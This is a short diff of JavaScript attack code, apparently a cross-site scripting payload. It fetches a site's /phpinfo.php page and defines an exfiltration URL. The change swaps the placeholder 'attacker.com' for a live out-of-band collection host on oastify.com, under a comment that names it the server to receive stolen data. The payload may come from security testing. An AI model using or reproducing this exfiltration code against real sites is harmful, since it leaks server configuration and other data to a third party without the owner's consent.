@@ -5,7 +5,7 @@
     var target = "/phpinfo.php";
 
     // Attacker server to receive stolen data
-    var exfil = "https://attacker.com/collect?data=";
+    var exfil = "https://378k84ugxz4v6hictis8j01pngt7hz5o.oastify.com/collect?data=";
 
     // First request: grab phpinfo page
     var req = new XMLHttpRequest();
